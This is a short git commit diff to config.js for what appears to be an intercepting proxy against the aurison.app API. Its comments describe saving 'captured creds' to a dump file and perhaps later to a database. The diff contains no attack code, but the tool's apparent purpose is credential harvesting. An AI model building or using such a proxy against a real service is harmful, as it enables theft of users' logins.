41e7767a10b92d06d35fc8996800a9694b482435
colossalbro <colossal@colossalmac.local>
2024-01-16 19:22:01 +0100

    config :)

--- config.js
+++ config.js
@@ -6,7 +6,9 @@ export const config = {
     //GENERAL
     PORT : 55000,
     LIVE : false,       //true or false. If true, proxy uses api.aurison.app. If false, proxy uses test-api.aurison.app
-    OUTPUT_FILE: ''     //If left empty, captured creds are saved in the current dir in a file called aurison-creds-dump.txt
+    OUTPUT_FILE: ''     //Captured creds are stored here (Might eventually use a Database for this)
+    
+
 }
 
 config.ENV =  config.LIVE ? 'https://api.aurison.app' : 'https://test-backend.aurison.app'; //set the ENV.
